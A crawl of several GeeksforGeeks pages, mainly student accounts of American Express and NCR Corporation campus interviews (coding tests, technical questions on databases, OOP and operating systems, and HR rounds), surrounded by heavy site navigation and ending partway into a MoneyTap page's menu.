feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

American Express Interview Experience for FTE | On-Campus 2020 - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Internship Interview Experiences Company-WiseAmazon Interview QuestionsCommonly Asked Java Programming Interview Questions | Set 2How I cracked TCS DigitalMicrosoft's most asked interview questionsTCS NQT Coding Questions & How Coding Task Evaluated in TCS NQTDirecti Interview | Set 7 (Programming Questions)TCS Digital Interview QuestionsGoogle Interview QuestionsAmazon Recruitment ProcessGoogle Online Challenge 2020How to write an Interview Experience?Zoho Interview | Set 3 (Off-Campus)Amazon SDE-1 Interview Experience | Amazon WOW-2020Adobe Interview Experience | SHECODES-Software EngineerJP Morgan Chase & Co. (JPMC) Interview Experience | (Full time Software Engineer)NCR Corporation (On-Campus Recruitment Drive)Accenture On Campus 2020 Placement DriveGoldman Sachs Interview Experience | Set 33 (For Experienced)Cognizant Interview Experience | Set 2 (On-Campus)Accenture Campus Placement Drive 2020TCS Ninja Interview Experience and Interview QuestionsCapgemini Virtual Hiring (New process) | 2021 BatchAccenture Interview Experience | Set 1 (On-Campus)Adobe Interview | Set 13 (On Campus for Internship)Amazon Interview | Set 44 (For Internship)ZS Associates Interview Experience | Set 1 (Technology Analyst - On Campus)Cognizant Interview Experience - Programmer Analyst TraineeTCS Interview Experience | Set 1 (On-Campus 2014)MathWorks Interview Experience (EDG, Oncampus) American Express Interview Experience for FTE | On-Campus 2020 Last Updated: 21-12-2020 American Express visited our campus on 23rd August 2020 for the position of Software Engineer Trainee at Gurgaon/Bangalore Location. There were 3 rounds for selection in the company. The CGPA cutoff was 7 and all the branches were allowed to apply for the test. Around 500-700 students gave the first round -online tests. Round-1 (Online Test): The first round was an online test conducted on Codility which comprised 3 coding questions that had to be solved in a duration of 1hr 30 min. The disadvantage of this platform is 80% of the test cases are hidden and are run in the background. So you can see your code running on only 2-3 test cases and it is very difficult to figure out whether the program is correct or not. The questions were as follows. Find the minimum number of deletions in a string for every letter to have a unique frequency of occurrence. Slight Modification of Rank of the graph. Number of Subarrays with sum 0 Tips: Try to solve all the coding questions correctly as only those people who are shortlisted solve all questions correctly. After the first round, 20 students including me were shortlisted for the next round which was an interview round. Round-2 (Technical Interview Round-1): This round was a technical interview round. The interviewer asked me to give a brief introduction about myself. I started my introduction by telling most of the things that were written on my CV. Then he asked me the following questions: Puzzle: 8-balls-problem: How to find a defective ball in 2 measurements Database Management System: What is the difference between SQL and NoSQL? Is MongoDB better than SQL, if yes then why? If no then why? Explain the concept of scalability in detail. What do you know about database sharding? Write an SQL query to find the second highest salary in the database. What is database indexing? Mathematics: Some mathematics questions based on linear equations. (Since in my resume it was mentioned that I won a maths event on a national level). Object-Oriented programming: Explain all the features of OOPS. What are the 2 types of polymorphism? What is function overloading? Explain with an example. What is the difference between function overloading and function overriding? What are virtual functions? What is inheritance and what are the types of inheritance? Operating Systems: What is the difference between a process and a thread? What is a mutex? How it is different from a binary semaphore? Tips: Be thorough with all the core computer science subjects because the interviewer may test your knowledge in any of the subjects. After this round, 12 students including me were shortlisted for the next round which was an HR round. Round-3 (Technical Round 2 + HR round): In this round, the interviewer asked me some common HR questions Tell me something about yourself. Discuss your projects. He asked many questions related to my projects. What are the advantages of Software-defined networks over traditional networks? (since it was my project) Then he gave me a problem which was a modified version of the Josephus problem. Tower of Hanoi Problem (code and explanation) Do you have any location preferences? Finally, the company selected 8 students from the campus. However, I could not make it to the final list because of the last round. Write your Interview Experience or mail it to contribute@geeksforgeeks.org My Personal Notes arrow_drop_up Save Recommended Posts:American Express Interview Experience | EDA/CFR (INT+FTE) VIT 2020American Express Interview Experience | EDA/CFR Capabilities FTE ( On-Campus )American Express Interview Experience for SDE (6-months Internship+FTE)American Express Interview Experience for EDA/CFR Role - On Campus Placement 2020American Express Interview Experience for Tech Role | On-Campus Internship 2020American Express Interview Experience | Set 1 (Off campus for Risk department)American Express Interview Experience | Set 2American Express Interview Experience (On Campus Internship)American Express Interview Experience | Off-CampusAmerican Express Interview Experience (On-Campus Internship)American Express Interview Experience | Analyst InternAmerican Express Interview Experience | 2019 Off-Campus GHCI SDEAmerican Express Interview Experience | 2019 Off-Campus SDE FreshersAmerican Express Interview Experience | On-Campus ( Techincal + EDA/CFR )American Express Interview Experience for Internship - EDA/CFR (On-Campus)American Express (On-Campus for Internship)American Express (On-Campus Internship, Full Time Offer)American Express (on campus 6 month internship)American Express Technology (On- Campus for Internship)American Express EDA/CFR | On-Campus for Internshipkunal1210Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : Interview ExperiencesAmerican ExpressOn-Campus Practice Tags : American Express thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page NCR Corporation Interview Experience for SDE (On-Campus) Next last_page Expedia Internship Interview Experience (On-Campus) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Interview Experiences Josh Technology Group Interview Experience for SD (On-Campus)Accenture Interview Experience (On-Campus)Amazon Interview Experience for System Development Engineer (On-Campus Dec 2020)Josh Technology Interview Experience | MCQ Online questionsJosh Technology Group Recruitment Process | Pool Drive More related articles in Interview Experiences Cognizant Interview Experience for GenC (On-Campus)Accenture Interview Experience (On-Campus 2021)Udaan Interview ExperienceIntuit Interview Experience | On-Campus InternshipHashedIn Interview Experience (On-Campus 2020) room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

American Express Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Lowest Common Ancestor in a Binary Tree | Set 1American Express (On-Campus Internship, Full Time Offer)American Express Interview Experience | Set 2American Express Technology (On- Campus for Internship)American Express Interview Experience (On Campus Internship)American Express (on campus 6 month internship)American Express (On-Campus for Internship)American Express Interview Experience | 2019 Off-Campus SDE FreshersAmerican Express Interview Experience (On-Campus Internship)American Express Interview Experience | Analyst InternAmerican Express Interview Experience for Tech Role | On-Campus Internship 2020American Express EDA/CFR | On-Campus for InternshipAmerican Express Interview Experience for Internship - EDA/CFR (On-Campus)American Express Interview Experience | EDA/CFR Capabilities FTE ( On-Campus )American Express Interview Experience | On-Campus ( Techincal + EDA/CFR )American Express Interview Experience for EDA/CFR Role - On Campus Placement 2020American Express Interview Experience | EDA/CFR (INT+FTE) VIT 2020American Express Interview Experience | Set 1 (Off campus for Risk department)American Express Interview Experience | Off-CampusAmerican Express Interview Experience for SDE (6-months Internship+FTE)American Express Interview Experience | 2019 Off-Campus GHCI SDEAmerican Express Interview Experience for FTE | On-Campus 2020 Tag Archives: American Express American Express Interview Experience for FTE | On-Campus 2020 Last Updated: 21-12-2020 American Express visited our campus on 23rd August 2020 for the position of Software Engineer Trainee at Gurgaon/Bangalore Location. There were 3 rounds for selection… Read More » Interview ExperiencesAmerican ExpressOn-Campus American Express Interview Experience for SDE (6-months Internship+FTE) Last Updated: 07-11-2020 American Express came to our college on 15th September 2020. Round 1(OT): We had to finish 3 questions within 1.5 hours. I finished in 58… Read More » InternshipInterview ExperiencesAmerican ExpressOn-Campus American Express Interview Experience for Internship – EDA/CFR (On-Campus) Last Updated: 13-10-2020 American Express came to our campus in September 2020 for hiring interns. Round 1 (Online Test): Consisted of 60 MCQs related to Aptitude, Verbal, Code… Read More » InternshipInterview ExperiencesAmerican ExpressOn-Campus American Express Interview Experience | EDA/CFR Capabilities FTE ( On-Campus ) Last Updated: 21-09-2020 Online Round: There were two coding questions. These questions were different for everybody. Many students were able to do both so they both were generally… Read More » Interview ExperiencesAmerican ExpressOn-Campus American Express Interview Experience | On-Campus ( Techincal + EDA/CFR ) Last Updated: 16-09-2020 4 American Express came to my college in the month of August 2020 for 2 Roles: Technical and EDA/CFR. They offered only an internship in the… Read More » Interview ExperiencesAmerican ExpressOn-Campus American Express Interview Experience for Tech Role | On-Campus Internship 2020 Last Updated: 15-09-2020 American Express recently visited Punjab Engineering College, Chandigarh for placements offering Internship+Full Time offers for TECH as well as EDA/CFR roles. The recruitment process of… Read More » InternshipInterview ExperiencesAmerican ExpressOn-Campus American Express Interview Experience | EDA/CFR (INT+FTE) VIT 2020 Last Updated: 17-09-2020 Round 1: Platform was mettl. 60 mcqs in 45 mins and 2 codes in 30 mins. Codes were very easy. They shortlisted 35 students for… Read More » Interview ExperiencesAmerican Express American Express Interview Experience for EDA/CFR Role – On Campus Placement 2020 Last Updated: 04-09-2020 American Express recently visited to Vellore Institute of Technology, Vellore for campus placements offering Internship+Full Time offers for EDA/CFR role. The recruitment process of American… Read More » Interview ExperiencesAmerican ExpressOn-Campus American Express Interview Experience | 2019 Off-Campus SDE Freshers Last Updated: 17-07-2020 3 Round1: Coding Round Round2: Coding Round Q1:- Given an array nums and two sliding windows of size K & L which don’t have any element… Read More » Interview ExperiencesAmerican ExpressOff-Campus American Express Interview Experience | 2019 Off-Campus GHCI SDE Last Updated: 16-07-2020 Round 1: GHCI Shortlist interview Round2: Coding Round3: Telephonic (38 mins) Q1 Introduce yourself? Q2 Explain your project. Q3 What are objects in java? Q4… Read More » Interview ExperiencesAmerican ExpressOff-Campus American Express Interview Experience | Analyst Intern Last Updated: 01-06-2020 Selection Process and Rounds 1. CV shortlist 2. Online Test 3. Interview (3 Rounds) The 1st round was an OT round and was in 2 parts. In… Read More » InternshipInterview ExperiencesAmerican Express American Express Interview Experience (On-Campus Internship) Last Updated: 01-06-2020 Round 1: CV shortlist Round 2: Online Test Round 3: Interview (2 Rounds) Online Test : We had two tests. One was technical and the other one was behavioral.… Read More » InternshipInterview ExperiencesAmerican ExpressOn-Campus American Express EDA/CFR | On-Campus for Internship Last Updated: 05-12-2019 Round 1: Technical and Aptitude Assessment MCQs based on Aptitude Output-based SQL Two simple coding questions. Round 2: Technical Interview Given a list [1, 2,… Read More » InternshipInterview ExperiencesAmerican ExpressOn-Campus American Express Interview Experience | Off-Campus Last Updated: 16-09-2019 Round 1: The first round was a hackathon(coding contest) conducted on Hackerearth platform. There were three coding questions, two questions were based on arrays and… Read More » Interview ExperiencesAmerican ExpressOff-Campus American Express Technology (On- Campus for Internship) Last Updated: 12-08-2019 4 American Express came to our college for both FTEs and Internship hiring. The CGPA cutoff was 6.5 and the eligible branches were CSE, ECE &… Read More » Interview ExperiencesAmerican ExpressOn-Campus Page 1 of 212» Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonTop 5 IDEs for C++ That You Should Try OnceHow to send an email from JavaScript ?How To Create a Countdown Timer Using Python?How to find index of a given element in a Vector in C++ room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

NCR Corporation Interview Experience for SDE (On-Campus) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Internship Interview Experiences Company-WiseAmazon Interview QuestionsCommonly Asked Java Programming Interview Questions | Set 2How I cracked TCS DigitalMicrosoft's most asked interview questionsTCS NQT Coding Questions & How Coding Task Evaluated in TCS NQTDirecti Interview | Set 7 (Programming Questions)TCS Digital Interview QuestionsGoogle Interview QuestionsAmazon Recruitment ProcessGoogle Online Challenge 2020How to write an Interview Experience?Zoho Interview | Set 3 (Off-Campus)Amazon SDE-1 Interview Experience | Amazon WOW-2020Adobe Interview Experience | SHECODES-Software EngineerJP Morgan Chase & Co. (JPMC) Interview Experience | (Full time Software Engineer)NCR Corporation (On-Campus Recruitment Drive)Accenture On Campus 2020 Placement DriveGoldman Sachs Interview Experience | Set 33 (For Experienced)Cognizant Interview Experience | Set 2 (On-Campus)Accenture Campus Placement Drive 2020TCS Ninja Interview Experience and Interview QuestionsCapgemini Virtual Hiring (New process) | 2021 BatchAccenture Interview Experience | Set 1 (On-Campus)Adobe Interview | Set 13 (On Campus for Internship)Amazon Interview | Set 44 (For Internship)ZS Associates Interview Experience | Set 1 (Technology Analyst - On Campus)Cognizant Interview Experience - Programmer Analyst TraineeTCS Interview Experience | Set 1 (On-Campus 2014)MathWorks Interview Experience (EDG, Oncampus) NCR Corporation Interview Experience for SDE (On-Campus) Last Updated: 21-12-2020 It consists of five rounds. Written, 2 technical, Managerial, and HR. Round 1(Written Test and Coding): It consists of 33 multiple choices and 2 coding questions. Multiple choice questions are from C, C++, Java, Data structures, DBMS, Operating systems, and some aptitude questions from profit and loss, percentages, directions, number system, etc which were easy to medium. And it consists of 2 coding questions. 109 members were shortlisted. Round 2(Technical Round): First a brief self-introduction, and then they asked me to explain oops concepts. They want me to explain each with a real-time example. Then they asked a few questions and they were: Implementation of method overloading and method overriding. Program to find a unique element in the array, and they asked me to reduce space complexity and then to reduce the time complexity. Thread scheduling and CPU scheduling. Program to implement the reverse of the linked list. Program to find whether the target sum is present in the array, and they asked to reduce space complexity and time complexity. Foreign key why is it necessary and use of it. Context switching. Lastly, they asked me if I had any questions. I asked a few questions, they answered them. 30 members were shortlisted Round 3(Technical Interview): It was for 30 minutes. First a brief self-introduction. They asked me to explain one of my projects and I used Flutter as the front end in this project then they asked why I used flutter and why not some other platform. Then they asked a few questions and they were: Hourglasses Puzzle (Given two hourglasses of 4 minutes and 7 minutes, the task is to measure 9 minutes.) Why manholes are round? Singleton class and how it is implemented. Operator overloading example. Application of self joins in real-time. C++ and java differences. The copy constructor and whether it is deep copy or shallow copy. Round 4(Managerial): First a brief self-introduction. Then I was asked a few questions, they were: • What do you learn from your interview experiences About strengths and weaknesses What is your greatest achievement till now? Is it okay for 5 years bond? What will you do if you get an offer from Google, Amazon, etc? Define success Why NCR Why should I hire you This round was like a friendly discussion, just be honest and confident. Sometimes, your next question is based on your present answer so think and answer, take your own time. Round 5(HR): First, he asked me to introduce myself and my family details and then hobbies. Then he asked a few questions What do you want to be a team leader or team member and why? Are you a smart worker or a hard worker? What do you like in your college? Then the process ended. Finally, 18 members were selected, and I was one of them. Write your Interview Experience or mail it to contribute@geeksforgeeks.org My Personal Notes arrow_drop_up Save Recommended Posts:NCR Corporation Interview Experience for SDE (On-Campus)NCR Corporation (On-Campus Recruitment Drive)MathWorks Interview Experience (EDG, Oncampus)ServiceNow Interview Experience OncampusUHG Interview Experience | OnCampus- 2019InfoEdge Interview Experience | OnCampus-2019Target Corporation Interview Experience | Set 1 (On-Campus)Computer Sciences Corporation (CSC) Interview Experience (On-Campus)Target Corporation Interview Experience | Set 3 (On-Campus)Target Corporation India Interview Experience (On-Campus)Target Corporation Interview Experience | Set 4 (On-Campus)Target Corporation Interview Experience | Set 5Sandisk Corporation Interview | Set 5 (2+ years of Experience)Bharat Petroleum Corporation Limited (BPCL) Interview Experience | (Pool Placement)Bharat Petroleum Corporation Limited(BPCL) Interview Experience | Set 2 (Pool Campus)Sears Holdings Corporation Interview ExperienceTarget Corporation Interview ExperienceFluke corporation(Fortive) Interview ExperienceTarget Corporation Interview ExperienceWabtec Corporation Interview Experience for FTE | On-Campus Virtual ProcessIf you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : Interview ExperiencesNCR CorporationOn-Campus thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page MoneyTap Interview Experience (On-Campus 2020) Next last_page American Express Interview Experience for FTE | On-Campus 2020 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Interview Experiences Cognizant Interview Experience for GenC (On-Campus)Amazon Interview Experience for System Development Engineer (On-Campus Dec 2020)HashedIn Interview Experience (On-Campus 2020)Meesho Interview ExperienceAvalara Technologies Interview Experience for FTE SDE | On-Campus More related articles in Interview Experiences Accenture Interview Experience (On-Campus)Google Interview Experience for Software Engineer 2021 New GradJosh Technology Group Interview Experience for SD (On-Campus)Udaan Interview ExperienceAmazon Interview Experience for SDE-Intern | On-Campus 2021 room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

NCR Corporation Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ NCR Corporation (On-Campus Recruitment Drive)NCR Corp. Interview Experience for Software Engineer Role (On-Campus)NCR Corporation Interview Experience for SDE (On-Campus)Split squares of first N natural numbers into two sets with minimum absolute difference of their sumsNCR Corporation Interview Experience for SDE (On-Campus) Tag Archives: NCR Corporation NCR Corporation Interview Experience for SDE (On-Campus) Last Updated: 21-12-2020 It consists of five rounds. Written, 2 technical, Managerial, and HR. Round 1(Written Test and Coding): It consists of 33 multiple choices and 2 coding… Read More » Interview ExperiencesNCR CorporationOn-Campus Split squares of first N natural numbers into two sets with minimum absolute difference of their sums Last Updated: 07-12-2020 Given an integer N, the task is to partition the squares of first N( always a multiple of 8 ) natural numbers into two sets… Read More » CombinatorialMathematicalRecursioninterview-preparationmaths-perfect-squareNatural NumbersNCR Corporationnumber-theory NCR Corporation Interview Experience for SDE (On-Campus) Last Updated: 17-11-2020 Round 1 (Online Coding): 30 MCQ’s based on OS, DBMS, Data Structures and Algorithms Two Coding questions based on number theory and strings. 25 students… Read More » Interview ExperiencesNCR CorporationOn-Campus NCR Corp. Interview Experience for Software Engineer Role (On-Campus) Last Updated: 12-02-2020 3 There were 5 rounds in total: Round-1(1hr:30min): Online round, consisted of aptitude 25 questions(Medium), Technical-MCQ’s 25 questions(Hard), 3 Coding questions(Medium). 25 shortlisted out of 70… Read More » Interview ExperiencesNCR CorporationOn-Campus NCR Corporation (On-Campus Recruitment Drive) Last Updated: 31-10-2019 2.8 Online test: This test consisted of 2 sections. One section was coding and the other was MCQs Coding section: This section contained 2 questions and… Read More » Interview ExperiencesNCR Corporation Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AIProof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in Python Most Visited Articles Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++Find the duration of difference between two dates in JavaHow to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

MoneyTap Interview Experience (On-Campus 2020) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Internship Interview Experiences Company-WiseAmazon Interview 